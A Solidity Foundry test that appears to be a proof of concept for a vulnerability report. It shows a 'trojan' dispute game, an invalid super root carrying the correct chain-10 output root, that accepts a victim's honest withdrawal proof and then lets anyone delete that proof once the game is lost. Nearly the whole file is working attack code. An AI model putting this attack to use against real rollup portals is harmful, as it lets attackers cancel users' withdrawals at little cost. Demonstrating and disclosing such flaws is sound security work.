// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;
import "forge-std/Test.sol";
import "./Ifaces.sol";
import { LifecycleBase } from "./Lifecycle.t.sol";

/// "Trojan game": an INVALID super-root game that embeds the CORRECT chain-10 output root.
/// The portal only consumes rootClaimByChainId(l2ChainId), so an honest, unmodified proof
/// (real calldata of mainnet tx 0x1214545b..., only the game index changed) is accepted against it.
/// When the honest challenger wins, the victim's proof is dead and permissionlessly deletable.
contract TrojanGameTest is LifecycleBase {
    event WithdrawalProofDeleted(bytes32 indexed withdrawalHash, address indexed proofSubmitter);

    WithdrawalTransaction wtx;
    OutputRootProof orp;
    bytes[] proof;
    bytes32 wh;
    address victimAddr;

    function _loadReal() internal {
        string memory j = vm.readFile("provetxs.json");
        bytes memory input = vm.parseJsonBytes(j, ".0.input");
        bytes memory body = new bytes(input.length - 4);
        for (uint256 i; i < body.length; i++) body[i] = input[i + 4];
        (WithdrawalTransaction memory w,, OutputRootProof memory o, bytes[] memory p) =
            abi.decode(body, (WithdrawalTransaction, uint256, OutputRootProof, bytes[]));
        wtx = w;
        orp = o;
        for (uint256 i; i < p.length; i++) proof.push(p[i]);
        wh = _hashWithdrawal(w);
        victimAddr = vm.parseJsonAddress(j, ".0.submitter");
    }

    function _mk(bytes memory extra) internal returns (IGame g, uint256 idx) {
        idx = DGF.gameCount();
        vm.prank(attacker);
        g = IGame(DGF.create{ value: 0.08 ether }(GT, keccak256(extra), extra));
    }

    function test_trojan_game_accepts_honest_proof_then_dies() public {
        _loadReal();
        (address gReal, uint64 tsReal) = PORTAL.provenWithdrawals(wh, victimAddr);
        bytes32 R = IGame(gReal).rootClaimByChainId(10);
        assertEq(R, keccak256(abi.encode(orp.version, orp.stateRoot, orp.messagePasserStorageRoot, orp.latestBlockhash)));
        uint64 T = uint64(IGame(gReal).l2SequenceNumber());

        // attacker: same timestamp, same (10, R), plus a bogus second chain entry -> non-canonical super root
        (IGame trojan, uint256 idx) =
            _mk(abi.encodePacked(bytes1(0x01), T, uint256(10), R, uint256(999), keccak256("junk")));
        assertTrue(trojan.wasRespectedGameTypeWhenCreated());
        assertEq(trojan.rootClaimByChainId(10), R);
        assertTrue(trojan.rootClaim() != IGame(gReal).rootClaim());

        // duplicate-chain variant is also accepted by initialize(): first match wins in rootClaimByChainId
        (IGame dup,) = _mk(abi.encodePacked(bytes1(0x01), T, uint256(10), R, uint256(10), keccak256("other")));
        assertEq(dup.rootClaimByChainId(10), R);

        // victim (or its tooling) re-proves with the UNCHANGED honest proof, pointing at the trojan index
        vm.warp(block.timestamp + 12);
        vm.prank(victimAddr);
        PORTAL.proveWithdrawalTransaction(wtx, idx, orp, proof);
        (address g2, uint64 ts2) = PORTAL.provenWithdrawals(wh, victimAddr);
        assertEq(g2, address(trojan));
        assertEq(ts2, block.timestamp);
        assertTrue(ts2 > tsReal);

        // honest challenger counters the non-canonical root; game resolves CHALLENGER_WINS
        _resolveChallengerWins(trojan);
        // bond accounting: the first (uncountered) counter-claimant takes the creator's 0.08 ETH bond.
        // If that claimant is the attacker's own second address posting the honest counter-claim, the
        // trojan costs gas only (NOT simulated here: `challenger` posts an arbitrary claim nobody counters).
        (bool okc, bytes memory ret) = address(trojan).staticcall(abi.encodeWithSignature("normalModeCredit(address)", challenger));
        assertTrue(okc);
        console.log("challenger normalModeCredit (wei)", abi.decode(ret, (uint256)));
        console.log("required bond for position 2 (wei)", trojan.getRequiredBond(2));
        (, address cb, address cl, uint128 bd,,,) = trojan.claimData(0);
        console.log("root counteredBy/claimant/bond", cb, cl, bd);
        (okc, ret) = address(trojan).staticcall(abi.encodeWithSignature("credit(address)", challenger));
        console.log("credit(challenger)", abi.decode(ret, (uint256)), challenger);
        (okc, ret) = address(trojan).staticcall(abi.encodeWithSignature("refundModeCredit(address)", challenger));
        console.log("refundModeCredit(challenger)", abi.decode(ret, (uint256)));
        vm.warp(block.timestamp + 30 days);
        vm.expectRevert(E_INVALID_ROOT);
        PORTAL.checkWithdrawal(wh, victimAddr);

        // anyone deletes the victim's now-dead proof
        vm.expectEmit(true, true, false, false, address(PORTAL));
        emit WithdrawalProofDeleted(wh, victimAddr);
        vm.prank(rando);
        PORTAL.deleteProvenWithdrawal(wh, victimAddr);
        vm.expectRevert(E_UNPROVEN);
        PORTAL.checkWithdrawal(wh, victimAddr);
        assertFalse(PORTAL.finalizedWithdrawals(wh));
    }
}
